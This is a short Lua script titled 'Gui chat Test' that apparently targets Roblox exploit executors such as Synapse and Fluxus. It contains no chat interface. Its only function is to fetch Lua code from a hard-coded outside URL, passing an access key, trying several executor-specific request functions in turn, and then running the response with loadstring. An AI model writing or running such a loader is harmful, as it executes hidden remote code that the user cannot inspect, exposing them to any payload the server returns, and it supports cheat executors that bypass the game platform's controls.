title: Gui chat Test
script:
local URL = "https://cloak-and-script.lovable.app/api/s/u4qkp06xw2?k=edb5e1498e25e5ba258d5521"
local KEY = URL:match("[?&]k=([^&]+)") or ""
local function cacheBust(u)
    return u .. (u:find("?", 1, true) and "&" or "?") .. "_sp=" .. tostring(math.random(100000, 999999999))
end
local function good(body)
    if type(body) ~= "string" or #body == 0 then return false end
    local low = body:sub(1, 300):lower()
    if low:find("<!doctype", 1, true) or low:find("<html", 1, true) then return false end
    if body:find("%-%- script not found", 1) or body:find("%-%- failed to fetch target script", 1) then return false end
    return true
end
local function fetch(u)
    u = cacheBust(u)
    local ok, body = pcall(function() return game:HttpGet(u, true) end)
    if ok and good(body) then return body end

    local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
    if req then
        local headers = { ["User-Agent"] = "Roblox/ScriptProxy" }
        if KEY ~= "" then headers["x-script-key"] = KEY end
        local okReq, res = pcall(function()
            local payload = { Url = u, URL = u, url = u, Method = "GET", method = "GET", Headers = headers, headers = headers }
            return req(payload)
        end)
        if okReq then
            if type(res) == "table" then
                local b = res.Body or res.body
                if good(b) then return b end
            elseif good(res) then
                return res
            end
        end
    end

    local HttpService = game:GetService("HttpService")
    local okAsync, asyncBody = pcall(function() return HttpService:GetAsync(u, true) end)
    if okAsync and good(asyncBody) then return asyncBody end
    error("ScriptProxy: failed to fetch script")
end
local src = fetch(URL)
local loader = (getgenv and getgenv().loadstring) or loadstring
assert(loader, "ScriptProxy: loadstring unavailable")
local fn, err = loader(src, "=ScriptProxy")
if not fn then error(err) end
return fn()
